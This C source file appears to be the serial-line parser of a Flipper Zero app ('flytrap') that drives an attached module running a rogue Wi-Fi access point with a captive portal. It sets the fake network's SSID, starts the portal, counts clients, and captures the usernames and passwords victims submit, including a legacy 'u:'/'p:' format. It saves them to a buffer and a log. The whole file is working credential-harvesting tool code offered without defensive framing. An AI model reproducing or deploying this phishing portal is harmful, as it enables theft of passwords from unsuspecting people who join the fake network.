#include "flytrap_parser.h"
#include "flytrap_storage.h"
#include "../flytrap_i.h"

static void flytrap_store_cred(FlytrapApp* app, const char* kv) {
    strncpy(app->captures[app->cap_head].kv, kv, FLYTRAP_CAP_KV_SIZE - 1);
    app->captures[app->cap_head].kv[FLYTRAP_CAP_KV_SIZE - 1] = '\0';
    app->cap_head = (app->cap_head + 1) % FLYTRAP_CAP_SLOTS;
    app->cap_count++;
    flytrap_storage_append_log(app, "cred", kv);
}

static void flytrap_process_line(FlytrapApp* app, const char* line) {
    if(strncmp(line, "STATUS ", 7) == 0) {
        const char* tok = line + 7;
        furi_string_set(app->status, tok);
        if(strncmp(tok, "html_ok", 7) == 0 && app->pending_setap) {
            app->pending_setap = false;
            FuriString* cmd = furi_string_alloc();
            furi_string_printf(cmd, "setap %s\n", furi_string_get_cstr(app->ssid));
            flytrap_uart_tx(
                app->uart, (const uint8_t*)furi_string_get_cstr(cmd), furi_string_size(cmd));
            furi_string_free(cmd);
        } else if(strncmp(tok, "ap_ok", 5) == 0) {
            flytrap_uart_tx(app->uart, (const uint8_t*)"start\n", 6);
        } else if(strncmp(tok, "portal_up", 9) == 0) {
            app->portal_running = true;
        } else if(strncmp(tok, "stopped", 7) == 0) {
            app->portal_running = false;
        }
    } else if(strncmp(line, "HIT", 3) == 0) {
        app->client_count++;
    } else if(strncmp(line, "CRED ", 5) == 0) {
        flytrap_store_cred(app, line + 5);
    } else if(strncmp(line, "u: ", 3) == 0) {
        // legacy firmware: username line, held until the matching password
        furi_string_set(app->legacy_user, line + 3);
    } else if(strncmp(line, "p: ", 3) == 0) {
        FuriString* kv = furi_string_alloc();
        furi_string_printf(
            kv, "u=%s&p=%s", furi_string_get_cstr(app->legacy_user), line + 3);
        flytrap_store_cred(app, furi_string_get_cstr(kv));
        furi_string_free(kv);
    }
    // Any other line is treated as status noise and ignored.
}

void flytrap_parser_feed(uint8_t* buf, size_t len, void* ctx) {
    FlytrapApp* app = ctx;
    for(size_t i = 0; i < len; i++) {
        char c = (char)buf[i];
        if(c == '\n') {
            size_t sz = furi_string_size(app->line_acc);
            if(sz > 0 && furi_string_get_char(app->line_acc, sz - 1) == '\r') {
                furi_string_left(app->line_acc, sz - 1);
            }
            flytrap_process_line(app, furi_string_get_cstr(app->line_acc));
            furi_string_reset(app->line_acc);
        } else {
            furi_string_push_back(app->line_acc, c);
            if(furi_string_size(app->line_acc) > FLYTRAP_LINE_MAX) {
                furi_string_reset(app->line_acc); // runaway guard
            }
        }
    }
    // Repaint the live view on the GUI thread.
    view_dispatcher_send_custom_event(app->view_dispatcher, FlytrapEventRefreshView);
}
